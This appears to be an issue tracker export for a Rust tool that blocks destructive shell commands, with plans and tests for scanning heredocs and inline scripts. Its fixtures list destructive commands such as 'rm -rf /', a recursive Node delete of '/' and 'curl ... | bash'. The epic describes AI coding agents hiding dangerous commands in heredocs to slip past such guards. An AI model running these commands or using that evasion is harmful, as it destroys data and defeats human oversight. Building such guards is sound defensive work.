{"id":"git_safety_guard-t8x.5","title":"Optional: confidence scoring for ambiguous cases (warn vs deny)","description":"## Objective\n\nReduce unwarranted hard blocks in ambiguous situations by introducing a lightweight confidence model that can:\n\n- trigger deeper analysis when needed\n- downgrade to WARN (not DENY) when confidence is low\n\nThis is intentionally **late-stage** (P4): only attempt once correctness, determinism, and baseline false-positive immunity are solid.\n\n## Background\n\nSome matches are high-confidence catastrophes (`git reset --hard`, `rm -rf /`). Others are context-dependent and risk false positives.\n\nA confidence model lets us avoid the worst UX failure mode:\n\n- tool hard-blocks when it \"isn't sure\"\n\n## Proposed design (v1)\n\n- Define a small set of confidence signals:\n  - match location: executed span vs data span\n  - wrapper context: `echo`, `rg`, `git commit -m` (likely data)\n  - presence of execution operators: `|`, `;`, `\u0026\u0026`, `$(...)`, backticks\n  - heredoc presence (requires deeper scan)\n\n- Evaluation flow:\n  1) classify execution contexts\n  2) run normal pack matching only on executed contexts\n  3) if a match exists but confidence is below threshold:\n     - run deeper analysis (tokenizer details, heredoc extraction/AST)\n  4) if still low confidence:\n     - WARN + log (do not DENY)\n\n## Safety constraints\n\n- Severity `error` rules still default DENY unless match is clearly only in data spans.\n\n## Acceptance criteria\n\n- Confidence scoring demonstrably reduces false-positive hard blocks in a curated corpus.\n- Adds no measurable overhead to the fast path when confidence scoring is disabled.\n\n## Tests\n\n- Corpus-based tests comparing decisions with and without confidence scoring enabled.\n\n## Dependencies\n\n- `git_safety_guard-t8x.2` execution-context classification\n- `git_safety_guard-1gt.3.1` severity taxonomy\n- `git_safety_guard-2ta` tiered heredoc scanning (for deeper analysis)\n","status":"open","priority":4,"issue_type":"feature","created_at":"2026-01-07T22:20:52.398306453-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:20:52.398306453-05:00","dependencies":[{"issue_id":"git_safety_guard-t8x.5","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T22:21:03.538080592-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.5","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T22:21:08.580197546-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.5","depends_on_id":"git_safety_guard-1gt.3.1","type":"blocks","created_at":"2026-01-07T22:21:13.624667883-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-t8x.5","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T22:21:18.668990541-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-tlog","title":"Add detailed tracing and logging for heredoc detection","description":"# Tracing and Logging Implementation\n\n## Objective\n\nAdd comprehensive tracing using the `tracing` crate to enable debugging and monitoring of heredoc detection.\n\n## Dependencies to Add\n\n```toml\n[dependencies]\ntracing = \"0.1\"\ntracing-subscriber = { version = \"0.3\", features = [\"env-filter\"] }\n```\n\n## Log Levels\n\n- **ERROR**: parsing failures, timeout exceeded\n- **WARN**: fallback triggered, unknown language\n- **INFO**: heredoc detected, command blocked/allowed\n- **DEBUG**: pattern matches, timing details\n- **TRACE**: full command text, AST details (redacted/truncated as needed)\n\n## Instrumentation Points\n\n### 1. Main Check Flow\n\n```rust\n#[tracing::instrument(skip(cmd), fields(cmd_len = cmd.len()))]\npub fn check_command(cmd: \u0026str) -\u003e CheckResult {\n    let start = Instant::now();\n\n    // Quick reject\n    if global_quick_reject(cmd) {\n        tracing::trace!(\"quick_reject: no relevant keywords\");\n        return CheckResult::allowed();\n    }\n\n    // Heredoc detection\n    if might_contain_heredoc(cmd) {\n        tracing::debug!(\"heredoc_detected: triggering Tier 2 analysis\");\n        if let Some(result) = check_heredoc(cmd) {\n            tracing::info!(\n                blocked = result.blocked,\n                reason = ?result.reason,\n                elapsed_us = start.elapsed().as_micros(),\n                \"heredoc_check_complete\"\n            );\n            return result;\n        }\n    }\n\n    // Pattern matching...\n}\n```\n\n### 2. Heredoc Analysis\n\n```rust\n#[tracing::instrument(skip(cmd))]\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    let extraction_start = Instant::now();\n    let heredoc = extract_heredoc(cmd)?;\n    tracing::debug!(\n        extraction_us = extraction_start.elapsed().as_micros(),\n        content_len = heredoc.content.len(),\n        \"heredoc_extracted\"\n    );\n\n    let lang = detect_language(\u0026heredoc);\n    tracing::debug!(language = ?lang, \"language_detected\");\n\n    let parse_start = Instant::now();\n    let matches = match_patterns(\u0026heredoc.content, lang);\n    tracing::debug!(\n        parse_us = parse_start.elapsed().as_micros(),\n        match_count = matches.len(),\n        \"patterns_checked\"\n    );\n\n    // ...\n}\n```\n\n### 3. Error Handling\n\n```rust\nmatch parse_with_ast_engine(\u0026content, lang) {\n    Ok(ast) =\u003e { /* ... */ }\n    Err(e) =\u003e {\n        tracing::warn!(\n            error = %e,\n            language = ?lang,\n            \"ast_parse_failed: falling back to allow\"\n        );\n        return None;  // Fail-open (hook)\n    }\n}\n```\n\n## Environment Variable Control\n\n```bash\n# Enable heredoc tracing\nRUST_LOG=dcg::heredoc=debug dcg check\n\n# Enable timing info only\nRUST_LOG=dcg=info dcg check\n\n# Full trace (very verbose)\nRUST_LOG=dcg=trace dcg check\n```\n\n## JSON Structured Logging\n\nFor machine parsing:\n\n```rust\ntracing_subscriber::fmt()\n    .json()\n    .with_env_filter(EnvFilter::from_default_env())\n    .init();\n```\n\n## Performance impact\n\n- Logging disabled: near-zero overhead (static checks)\n- INFO/DEBUG: bounded overhead per event\n- TRACE: may include serialization; should be opt-in and redacted\n\n## Acceptance Criteria\n\n- When tracing is disabled, heredoc path performance is not meaningfully impacted.\n- When enabled, logs include:\n  - tier timings (trigger/extract/parse/match)\n  - language chosen (or unknown)\n  - rule attribution for matches\n  - explicit markers when fail-open occurs (timeout/parse error)\n- Logging is safe-by-default:\n  - no unbounded command/contents output\n  - redaction/truncation available\n- Unit tests can capture logs deterministically for at least one positive and one error path.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:10:08.819418841-05:00","dependencies":[{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:33.00690866-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-1gt.4","type":"relates-to","created_at":"2026-01-07T20:11:15.436832681-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:41.262191531-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-uau","title":"Define Bash/Shell destructive patterns for heredoc scanning","description":"## Objective\n\nDefine how to detect destructive shell operations inside *shell* heredoc bodies with high signal and low false positives.\n\n## Key insight\n\nFor shell heredocs, we should avoid inventing a second “pattern language” if we can reuse the existing dcg evaluator.\n\nPreferred approach:\n\n1. Parse the heredoc body as shell (tree-sitter-bash).\n2. Extract candidate simple-command invocations (command + args).\n3. Reconstruct a normalized command string.\n4. Feed each extracted command into the existing evaluator (packs + overrides + severity policy).\n\nThis keeps all destructive knowledge in one place (packs) and reduces drift.\n\n## What to extract (v1)\n\n- Simple commands: `rm -rf ...`, `git reset --hard ...`, `docker system prune`, etc.\n- Pipe targets: right-hand side of `|` (executed)\n- Command substitutions: `$(...)` / backticks (executed)\n\n## What NOT to treat as executed (avoid false positives)\n\n- comments\n- string literals printed with `echo`/`printf`\n- here-doc delimiters themselves\n\n## Severity guidance\n\n- Direct matches to catastrophic pack rules → `Error` (deny by default)\n- Ambiguous/dynamic constructs (variable-built commands) → `Warning` at most unless payload is confidently destructive\n\n## Testing requirements\n\n- Positive fixtures (must detect):\n  - `rm -rf /` (or other catastrophic)\n  - `git reset --hard`\n  - `git clean -fd`\n  - `docker system prune` (if pack enabled)\n- Negative fixtures (must not flag):\n  - `echo \"rm -rf\"`\n  - comments mentioning dangerous commands\n  - harmless cleanup under `/tmp` (if policy allows)\n\n## Acceptance Criteria\n\n- Defines the extraction→evaluation approach clearly enough to implement without re-reading external plans.\n- Produces a fixture list that covers:\n  - executed vs data-only contexts\n  - pipes and command substitution\n- Avoids introducing new destructive-rule definitions for shell when existing packs already encode them.\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T18:34:59.51511691-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:18:30.498745741-05:00","closed_at":"2026-01-08T10:18:30.498745741-05:00","close_reason":"Implemented shell command extraction for evaluator integration: extract_shell_commands() parses shell heredocs via ast-grep, extracts simple commands from AST, and returns them for evaluation against existing packs. 26 tests cover positive/negative fixtures (pipelines, subshells, command substitution, comments, echo strings). No new pattern rules - reuses existing evaluator.","dependencies":[{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:11.201594037-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:11.220201218-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:46.404600718-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-unit","title":"Create comprehensive unit test suite for heredoc detection","description":"# Unit Test Suite for Heredoc Detection\n\n## Objective\n\nCreate thorough unit tests for each component of the heredoc detection system.\n\n## Test Modules\n\n### 1. Tier 1 Regex Tests (`tests/tier1_regex.rs`)\n\n```rust\nmod tier1_regex_tests {\n    use super::*;\n    \n    #[test]\n    fn test_bash_heredoc_variants() {\n        // Standard heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003cEOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c 'EOF'\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c \\\"EOF\\\"\"));\n        \n        // Indented heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c- EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c-EOF\"));\n        \n        // Here-string\n        assert!(might_contain_heredoc(\"cat \u003c\u003c\u003c 'hello'\"));\n    }\n    \n    #[test]\n    fn test_inline_script_flags() {\n        // Python\n        assert!(might_contain_heredoc(\"python -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python3 -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python -e 'print(1)'\")); // -e not valid but we catch\n        \n        // Node.js\n        assert!(might_contain_heredoc(\"node -e 'console.log(1)'\"));\n        assert!(might_contain_heredoc(\"node -p 'process.version'\"));\n        \n        // Ruby\n        assert!(might_contain_heredoc(\"ruby -e 'puts 1'\"));\n        \n        // Perl\n        assert!(might_contain_heredoc(\"perl -e 'print 1'\"));\n        assert!(might_contain_heredoc(\"perl -E 'say 1'\"));\n        \n        // Shell\n        assert!(might_contain_heredoc(\"bash -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"sh -c 'echo hi'\"));\n        assert!(might_contain_heredoc(\"zsh -c 'echo hi'\"));\n    }\n    \n    #[test]\n    fn test_pipe_to_interpreter() {\n        assert!(might_contain_heredoc(\"curl http://x.com | bash\"));\n        assert!(might_contain_heredoc(\"cat script.py | python3\"));\n        assert!(might_contain_heredoc(\"echo code | node\"));\n    }\n    \n    #[test]\n    fn test_negative_cases() {\n        assert!(!might_contain_heredoc(\"git status\"));\n        assert!(!might_contain_heredoc(\"cargo build\"));\n        assert!(!might_contain_heredoc(\"ls -la\"));\n        assert!(!might_contain_heredoc(\"cat file.txt\"));\n        assert!(!might_contain_heredoc(\"grep pattern file\"));\n    }\n}\n```\n\n### 2. Heredoc Extraction Tests (`tests/extraction.rs`)\n\n```rust\nmod extraction_tests {\n    #[test]\n    fn test_extract_simple_heredoc() {\n        let cmd = \"python3 \u003c\u003c 'EOF'\\nprint('hello')\\nEOF\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"print('hello')\\n\");\n        assert_eq!(heredoc.delimiter, \"EOF\");\n        assert!(heredoc.quoted);\n    }\n    \n    #[test]\n    fn test_extract_indented_heredoc() {\n        let cmd = \"bash \u003c\u003c- 'END'\\n\\techo hello\\n\\techo world\\n\\tEND\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        // \u003c\u003c- strips leading tabs\n        assert_eq!(heredoc.content, \"echo hello\\necho world\\n\");\n    }\n    \n    #[test]\n    fn test_extract_inline_script() {\n        let cmd = \"python3 -c 'import os; os.system(\\\"ls\\\")'\";\n        let heredoc = extract_heredoc(cmd).unwrap();\n        assert_eq!(heredoc.content, \"import os; os.system(\\\"ls\\\")\");\n    }\n}\n```\n\n### 3. Language Detection Tests (`tests/language_detection.rs`)\n\n```rust\nmod language_detection_tests {\n    #[test]\n    fn test_detect_from_command() {\n        assert_eq!(detect_language_from_cmd(\"python3 -c\"), Language::Python);\n        assert_eq!(detect_language_from_cmd(\"node -e\"), Language::JavaScript);\n        assert_eq!(detect_language_from_cmd(\"ruby -e\"), Language::Ruby);\n        assert_eq!(detect_language_from_cmd(\"perl -e\"), Language::Perl);\n        assert_eq!(detect_language_from_cmd(\"bash -c\"), Language::Bash);\n    }\n    \n    #[test]\n    fn test_detect_from_shebang() {\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/env python3\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"#!/bin/bash\\n\"), Language::Bash);\n        assert_eq!(detect_language_from_content(\"#!/usr/bin/node\\n\"), Language::JavaScript);\n    }\n    \n    #[test]\n    fn test_detect_from_content_heuristics() {\n        assert_eq!(detect_language_from_content(\"import os\\n\"), Language::Python);\n        assert_eq!(detect_language_from_content(\"require('fs')\\n\"), Language::JavaScript);\n        assert_eq!(detect_language_from_content(\"use strict;\\n\"), Language::Perl);\n    }\n}\n```\n\n### 4. Pattern Matching Tests (`tests/patterns.rs`)\n\nOne submodule per language with comprehensive tests.\n\n### 5. False Positive Tests (`tests/false_positives.rs`)\n\n```rust\nmod false_positive_tests {\n    #[test]\n    fn test_documentation_allowed() {\n        // These should NOT be blocked\n        assert!(check_command(\"bd create --description='blocks rm -rf'\").is_allowed());\n        assert!(check_command(\"git commit -m 'fix rm -rf detection'\").is_allowed());\n        assert!(check_command(\"grep 'rm -rf' src/\").is_allowed());\n    }\n}\n```\n\n## Coverage Requirements\n\n- Line coverage: \u003e 90%\n- Branch coverage: \u003e 85%\n- All public functions have tests\n- All error paths tested","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:15:47.843153995-05:00","closed_at":"2026-01-07T21:15:47.843153995-05:00","close_reason":"Duplicate; consolidated into git_safety_guard-8wt","dependencies":[{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:33.163885724-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T19:28:33.346249627-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:28:33.507729581-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-unit","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:28:33.663971771-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-y4j","title":"Implement heredoc content extraction","description":"# Implement Heredoc Content Extraction\n\n## Objective\n\nExtract the actual script content from detected heredocs / inline scripts for scanning.\n\n## Background\n\nOnce we detect a heredoc is present, we need to accurately extract its content. This is more complex than detection because we must:\n\n1. Identify the delimiter\n2. Find the matching end delimiter\n3. Handle quoting and expansion rules\n4. Preserve or strip indentation as appropriate\n\n## Implementation Details\n\n### Heredoc extraction logic\n\n```rust\npub struct HeredocContent {\n    /// The extracted script content\n    pub content: String,\n    /// Detected or inferred language\n    pub language: Option\u003cLanguage\u003e,\n    /// Original delimiter used\n    pub delimiter: String,\n    /// Whether the delimiter was quoted (no expansion)\n    pub quoted: bool,\n    /// Byte offset in original command\n    pub start_offset: usize,\n    pub end_offset: usize,\n}\n\npub fn extract_heredoc(cmd: \u0026str) -\u003e Option\u003cHeredocContent\u003e {\n    // 1. Find heredoc start pattern\n    // 2. Extract delimiter (handle quoting)\n    // 3. Find matching end delimiter\n    // 4. Extract content between\n    // 5. Apply indentation rules for \u003c\u003c- / \u003c\u003c~\n}\n```\n\n### Delimiter handling\n\n- Unquoted: EOF, END, SCRIPT\n- Single-quoted: `'EOF'`, `'END'`\n- Double-quoted: `\"EOF\"`, `\"END\"`\n\n### Indentation rules\n\n- Standard `\u003c\u003c`: preserve all indentation\n- Tab-stripped `\u003c\u003c-`: remove leading tabs from content AND delimiter line\n- Zsh `\u003c\u003c~`: remove common leading whitespace (decide v1 support explicitly)\n\n### Edge cases\n\n- multiple heredocs in one command\n- heredocs with pipes\n- empty heredocs\n- malformed heredocs (missing terminator)\n\n### Inline script extraction (non-heredoc)\n\nAlso handle `-c`/`-e` style inline scripts:\n\n- `python -c \"import os; os.system('...')\"`\n- `node -e \"require('fs').rmSync('/', { recursive: true })\"`\n\n## Performance + safety constraints\n\n- Extraction must be bounded by a max byte limit (ties into global limits).\n- On malformed or ambiguous input in hook mode: fail-open and emit diagnostic trace/log.\n\n## Testing\n\n- delimiter quoting variants\n- `\u003c\u003c`, `\u003c\u003c-`, (optional) `\u003c\u003c~`\n- inline `-c`/`-e` extraction\n- malformed heredocs (no crash)\n- multiple heredocs\n\n## Acceptance Criteria\n\n- Extracts correct content for all heredoc forms explicitly supported by `git_safety_guard-o15`.\n- Handles malformed input without panicking; hook mode defaults to allow with a diagnostic.\n- Honors size limits (truncates/aborts extraction in a defined way) and does not allocate unboundedly.\n- Provides stable offsets/line mapping sufficient for explain output (match spans / context windows).\n","status":"closed","priority":2,"issue_type":"task","assignee":"SunnyMill","created_at":"2026-01-07T18:31:21.081724798-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:51:59.900314361-05:00","closed_at":"2026-01-08T01:51:59.900314361-05:00","close_reason":"Implemented Tier 2 heredoc content extraction in src/heredoc.rs:\n\n**Inline script extraction:**\n- Single-quote and double-quote patterns for -c/-e/-p flags\n- Supports python/python3, ruby/irb, perl, node, sh/bash/zsh/fish\n- Language detection via ScriptLanguage::from_command()\n\n**Here-string extraction (\u003c\u003c\u003c):**\n- Quoted and unquoted forms\n- Returns HeredocType::HereString\n\n**Heredoc extraction (\u003c\u003c, \u003c\u003c-, \u003c\u003c~):**\n- Standard heredocs with delimiter matching\n- Tab-stripped heredocs (\u003c\u003c-) \n- Indentation-stripped heredocs (\u003c\u003c~)\n- Quoted delimiter detection (suppresses expansion)\n\n**Safety bounds:**\n- max_body_bytes (1MB default)\n- max_body_lines (10,000 default)\n- max_heredocs (10 per command default)\n- Input size enforcement\n\n**Tests:** 21 tests covering all extraction scenarios.\n139 lib + 92 bin tests pass.","dependencies":[{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:31:27.231452201-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:51.539476777-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-y4j","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T23:13:47.815532037-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-yza","title":"Epic: ast-grep Integration for Heredoc Detection","description":"# Epic: ast-grep Integration for Heredoc Detection\n\n## Problem Statement\n\nAI coding agents sometimes attempt to bypass destructive command guards by embedding dangerous commands inside heredoc scripts. The current dcg implementation only examines the top-level command, missing destructive patterns hidden within inline scripts.\n\n### Example Attack Vectors\n\nAn attacker might use Python, Bash, Node.js, or other language heredocs to embed dangerous operations that slip past the quick-reject filter. The top-level command appears benign (e.g., \"python3 \u003c\u003c EOF\") while the heredoc body contains destructive operations.\n\n## Solution Overview\n\nIntegrate ast-grep (or tree-sitter directly) to:\n1. Detect heredoc patterns in commands\n2. Extract embedded script content\n3. Parse the script according to its detected language\n4. Check for destructive patterns within the parsed AST\n5. Block if dangerous patterns are found\n\n## Why ast-grep?\n\nast-grep uses tree-sitter for parsing, providing:\n- **Structural awareness**: Understands code structure, not just text patterns\n- **Language support**: Handles Python, Bash, JavaScript, TypeScript, Ruby, Perl, and many more\n- **Pattern matching**: Powerful AST pattern matching syntax\n- **Battle-tested**: Used in production for large-scale code search and refactoring\n\n## Key Technical Challenges\n\n1. **Heredoc Syntax Variants**: Many forms exist (\u003c\u003c, \u003c\u003c-, \u003c\u003c\u003c, \u003c\u003c~, quoted vs unquoted delimiters)\n2. **Language Detection**: Must infer language from command prefix, shebang, or heuristics\n3. **Performance**: Every command passes through dcg; parsing must be fast\n4. **Pattern Library**: Need comprehensive patterns per language for destructive operations\n5. **Obfuscation**: Attackers might use encoding, string concatenation, or indirect execution\n\n## Success Criteria\n\n- Detect and block heredoc-embedded destructive commands\n- Minimal latency impact (under 10ms for heredoc detection, under 50ms for full parsing)\n- Support Python, Bash, JavaScript/TypeScript, Ruby, Perl at minimum\n- Configurable via pack system (heredoc scanning can be enabled/disabled)\n- Comprehensive test coverage for bypass attempts\n\n## Architecture Decision\n\nWe will evaluate two integration approaches:\n1. **External binary**: Call ast-grep CLI and parse JSON output\n2. **Library integration**: Use tree-sitter Rust bindings directly\n\nThe decision will be made in the research phase based on:\n- Performance benchmarks\n- Dependency complexity\n- Maintenance burden\n- Pattern expressiveness\n\n## Out of Scope (for initial implementation)\n\n- Scanning files referenced in commands (e.g., \"bash script.sh\")\n- Deep obfuscation detection (base64, rot13, etc.)\n- Network-based command retrieval (\"curl ... | bash\" style)\n- Recursive heredoc nesting","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T18:28:08.502051689-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:28:08.502051689-05:00","dependencies":[{"issue_id":"git_safety_guard-yza","depends_on_id":"git_safety_guard-t8x","type":"relates-to","created_at":"2026-01-07T21:53:37.07782574-05:00","created_by":"ubuntu"}]}
